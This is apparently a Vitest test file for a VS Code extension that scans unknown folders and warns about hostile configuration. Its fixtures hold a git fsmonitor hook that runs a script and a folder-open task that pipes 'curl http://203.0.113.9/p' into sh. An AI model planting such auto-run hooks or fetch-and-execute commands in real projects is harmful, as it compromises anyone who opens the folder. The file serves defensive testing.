import { beforeEach, describe, expect, test, vi } from 'vitest';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import * as vscode from 'vscode';
import { checkUnknownFolder, QUICK_LIMITS, wasWarnedRecently, WARNED_KEY, type UnknownFolderDeps } from '../../src/guard/unknownFolder';
import { createQuarantineDir } from '../../src/quarantine/paths';
import { scanJob } from '../../src/scan/scanJob';
import type { EngineResult } from '../../src/engine/types';
import type { KeyValueStore } from '../../src/quarantine/registry';
import { f } from '../engine/helpers';

const TITLE = "Don't trust this folder";
const memory = (): KeyValueStore & { data: Map<string, unknown> } => {
  const data = new Map<string, unknown>();
  return { data, get: <V>(k: string, d: V) => (data.has(k) ? (data.get(k) as V) : d), update: async (k, v) => void data.set(k, v) };
};
const ch = (...c: number[]) => String.fromCharCode(...c);

function setup(over: Partial<UnknownFolderDeps> & { result?: EngineResult | (() => Promise<EngineResult>); answer?: string } = {}) {
  const modals: { title: string; detail: string; buttons: string[] }[] = [];
  const closed: number[] = [];
  const state = memory();
  const scan = vi.fn(async (_root: string) => {
    const r = over.result ?? { findings: [], notChecked: [], purls: [] };
    return typeof r === 'function' ? r() : r;
  });
  const deps: UnknownFolderDeps = {
    scan,
    showModal: async (title, detail, buttons) => (modals.push({ title, detail, buttons }), over.answer),
    closeFolder: async () => void closed.push(1),
    state,
    now: () => 1_000,
    ...over,
  };
  delete (deps as Partial<typeof over>).result;
  delete (deps as Partial<typeof over>).answer;
  return { deps, modals, closed, state, scan };
}
const folder = () => {
  const dir = mkdtempSync(join(tmpdir(), 'stack3-unk-'));
  return { dir, uri: vscode.Uri.file(dir) };
};
const hostile: EngineResult = {
  findings: [
    { ...f('critical', 'gitconfig.exec-key'), title: 'The repo .git/config makes git run a command', evidence: 'core.fsmonitor = ./evil.sh', location: { file: '.git/config', line: 3 } },
    { ...f('high', 'tasks.folder-open'), title: 'Task runs automatically when the folder opens', location: { file: '.vscode/tasks.json', line: 14 } },
  ],
  notChecked: [],
  purls: [],
};

beforeEach(() => vi.clearAllMocks());

describe('the warning', () => {
  test('untrusted folder with a hostile .git/config → a modal titled "Don\'t trust this folder" that names the finding', async () => {
    const t = setup({ result: hostile });
    const { uri } = folder();
    await checkUnknownFolder(uri, false, t.deps);
    expect(t.modals).toHaveLength(1);
    expect(t.modals[0]!.title).toBe(TITLE);
    expect(t.modals[0]!.detail).toContain('The repo .git/config makes git run a command (.git/config:3)');
    expect(t.modals[0]!.detail).toContain('Task runs automatically when the folder opens (.vscode/tasks.json:14)');
  });
  test('trusted → says auto-run tasks may already have run; untrusted → does not, and tells you to stay in Restricted Mode', async () => {
    const trusted = setup({ result: hostile });
    await checkUnknownFolder(folder().uri, true, trusted.deps);
    expect(trusted.modals[0]!.detail).toMatch(/Auto-run tasks may already have run/);
    const untrusted = setup({ result: hostile });
    await checkUnknownFolder(folder().uri, false, untrusted.deps);
    expect(untrusted.modals[0]!.detail).not.toMatch(/already have run/);
    expect(untrusted.modals[0]!.detail).toMatch(/Restricted Mode/);
  });
  test('it is honest that this is best effort and ran nothing from the folder', async () => {
    const t = setup({ result: hostile });
    await checkUnknownFolder(folder().uri, false, t.deps);
    expect(t.modals[0]!.detail).toMatch(/best effort/i);
    expect(t.modals[0]!.detail).toMatch(/ran nothing from this folder/i);
  });
  test('clean folder → no modal', async () => {
    const t = setup();
    await checkUnknownFolder(folder().uri, false, t.deps);
    expect(t.modals).toEqual([]);
  });
  test('only high or critical findings warn: caution alone does not, and a folder that could not be fully checked is not accused', async () => {
    const caution = setup({ result: { findings: [f('caution')], notChecked: [], purls: [] } });
    await checkUnknownFolder(folder().uri, false, caution.deps);
    expect(caution.modals).toEqual([]);
    const unknown = setup({ result: { findings: [], notChecked: ['Scan timed out'], purls: [] } });
    await checkUnknownFolder(folder().uri, false, unknown.deps);
    expect(unknown.modals).toEqual([]);
  });
  test('shows the top 3 findings, most severe first, and says how many more', async () => {
    const many = { findings: [f('high', 'a'), f('high', 'b'), f('high', 'c'), f('high', 'd'), f('critical', 'e')].map((x, i) => ({ ...x, title: `Finding ${i}` })), notChecked: [], purls: [] };
    const t = setup({ result: many });
    await checkUnknownFolder(folder().uri, false, t.deps);
    const d = t.modals[0]!.detail;
    expect(d).toContain('1. Finding 4'); // the critical one comes first although it was last in the input
    expect((d.match(/^\d\. /gm) ?? []).length).toBe(3);
    expect(d).toMatch(/and 2 more/);
  });
  test('warned once per folder, remembered across restarts; another folder is warned separately', async () => {
    const t = setup({ result: hostile });
    const a = folder();
    await checkUnknownFolder(a.uri, false, t.deps);
    await checkUnknownFolder(a.uri, false, t.deps);
    expect(t.modals).toHaveLength(1);
    const restarted = setup({ result: hostile, state: t.state });
    await checkUnknownFolder(a.uri, false, restarted.deps);
    expect(restarted.modals).toEqual([]);
    await checkUnknownFolder(folder().uri, false, t.deps);
    expect(t.modals).toHaveLength(2);
  });
  test('two checks at the same moment give one modal and one scan, even when the scan takes a while', async () => {
    const t = setup({ result: () => new Promise((r) => setTimeout(() => r(hostile), 50)) });
    const a = folder();
    await Promise.all([checkUnknownFolder(a.uri, false, t.deps), checkUnknownFolder(a.uri, false, t.deps), checkUnknownFolder(a.uri, true, t.deps)]);
    expect(t.modals).toHaveLength(1);
    expect(t.scan).toHaveBeenCalledTimes(1);
  });
  test('the "Close this folder" button closes it; dismissing the modal does nothing', async () => {
    const yes = setup({ result: hostile, answer: 'Close this folder' });
    await checkUnknownFolder(folder().uri, false, yes.deps);
    expect(yes.closed).toHaveLength(1);
    expect(yes.modals[0]!.buttons).toEqual(['Close this folder']);
    const no = setup({ result: hostile, answer: undefined });
    await checkUnknownFolder(folder().uri, false, no.deps);
    expect(no.closed).toEqual([]);
  });
  test('wording never claims safety and shows no secret or hidden character from the folder', async () => {
    const key = 'e6'.repeat(32);
    const bidi = ch(0x202e);
    const t = setup({ result: { findings: [{ ...f('critical'), title: `Run${bidi} this ${'x'.repeat(400)}`, evidence: `PRIVATE_KEY=0x${key}`, location: { file: `a${bidi}.json`, line: 1 } }], notChecked: [], purls: [] } });
    await checkUnknownFolder(folder().uri, false, t.deps);
    const text = t.modals[0]!.title + t.modals[0]!.detail;
    expect(text).not.toMatch(/\bsafe\b/i);
    expect(text).not.toContain(key);
    expect(text).not.toContain(bidi);
    expect(t.modals[0]!.detail.length).toBeLessThan(1500);
  });
});

describe('when it does nothing', () => {
  test('a folder Stack3 cloned itself is skipped: the clone flow already showed its verdict', async () => {
    const tmp = mkdtempSync(join(tmpdir(), 'stack3-unk-root-'));
    const prev = process.env.TMPDIR;
    process.env.TMPDIR = tmp;
    try {
      const dir = await createQuarantineDir('octo', 'hello');
      const t = setup({ result: hostile });
      await checkUnknownFolder(vscode.Uri.file(dir), false, t.deps);
      expect(t.scan).not.toHaveBeenCalled();
      expect(t.modals).toEqual([]);
    } finally {
      if (prev === undefined) delete process.env.TMPDIR;
      else process.env.TMPDIR = prev;
    }
  });
  test('a folder that is not on this computer\'s disk is skipped, even if the same path happens to exist here', async () => {
    const t = setup({ result: hostile });
    const here = folder();
    await checkUnknownFolder(vscode.Uri.from({ scheme: 'vscode-remote', path: here.dir }), false, t.deps);
    await checkUnknownFolder(vscode.Uri.from({ scheme: 'untitled', path: here.dir }), false, t.deps);
    expect(t.scan).not.toHaveBeenCalled();
    expect(t.modals).toEqual([]);
  });
  test('a folder that does not exist is skipped', async () => {
    const t = setup({ result: hostile });
    await checkUnknownFolder(vscode.Uri.file(join(tmpdir(), 'does-not-exist-stack3')), false, t.deps);
    expect(t.scan).not.toHaveBeenCalled();
  });
  test('a scan that throws is swallowed: no modal, no crash, and it is tried again next time', async () => {
    let boom = true;
    const t = setup({ result: () => (boom ? Promise.reject(new Error('worker died')) : Promise.resolve(hostile)) });
    const a = folder();
    await expect(checkUnknownFolder(a.uri, false, t.deps)).resolves.toBeUndefined();
    expect(t.modals).toEqual([]);
    boom = false;
    await checkUnknownFolder(a.uri, false, t.deps);
    expect(t.modals).toHaveLength(1);
  });
  test('a modal that fails to show does not crash, and the folder is not marked as warned', async () => {
    const t = setup({ result: hostile, showModal: async () => { throw new Error('ui'); } });
    const a = folder();
    await expect(checkUnknownFolder(a.uri, false, t.deps)).resolves.toBeUndefined();
    expect((t.state.data.get(WARNED_KEY) as Record<string, number> | undefined) ?? {}).toEqual({});
  });
});

describe('the quick scan', () => {
  test('is bounded: a few seconds, thousands of files, small files', async () => {
    expect(QUICK_LIMITS).toMatchObject({ timeoutMs: 5000, maxFiles: 5000 });
    expect(QUICK_LIMITS.maxFileBytes).toBeLessThanOrEqual(256 * 1024);
    expect(QUICK_LIMITS.maxTotalBytes).toBeLessThanOrEqual(20 * 1024 * 1024);
  });
  test('the scan function is handed the real folder path', async () => {
    const t = setup();
    const a = folder();
    await checkUnknownFolder(a.uri, false, t.deps);
    expect(t.scan).toHaveBeenCalledWith(a.dir);
  });
  test('end to end with the real quick scan: a hostile .git/config and a folderOpen task are found, and nothing is run', async () => {
    const a = folder();
    mkdirSync(join(a.dir, '.git'));
    writeFileSync(join(a.dir, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n\tfsmonitor = ./evil.sh\n');
    mkdirSync(join(a.dir, '.vscode'));
    writeFileSync(join(a.dir, '.vscode', 'tasks.json'), JSON.stringify({ version: '2.0.0', tasks: [{ label: 'x', command: 'curl http://203.0.113.9/p | sh', runOptions: { runOn: 'folderOpen' } }] }));
    const marker = join(a.dir, 'RAN');
    writeFileSync(join(a.dir, 'evil.sh'), `#!/bin/sh\ntouch "${marker}"\n`, { mode: 0o755 });
    const t = setup({ scan: (root) => scanJob({ root, ctx: { mode: 'quick', checkedAt: 'now' }, limits: QUICK_LIMITS }) });
    await checkUnknownFolder(a.uri, true, t.deps);
    expect(t.modals).toHaveLength(1);
    expect(t.modals[0]!.detail).toContain('.git/config:3');
    expect((await import('node:fs')).existsSync(marker)).toBe(false);
  });
  test('the "recently warned" signal lets the watcher stay quiet about the same folder', async () => {
    const t = setup({ result: hostile });
    const a = folder();
    expect(wasWarnedRecently(a.dir)).toBe(false);
    await checkUnknownFolder(a.uri, true, t.deps);
    expect(wasWarnedRecently(a.dir)).toBe(true);
    expect(wasWarnedRecently(join(a.dir, 'other'))).toBe(false);
  });
});
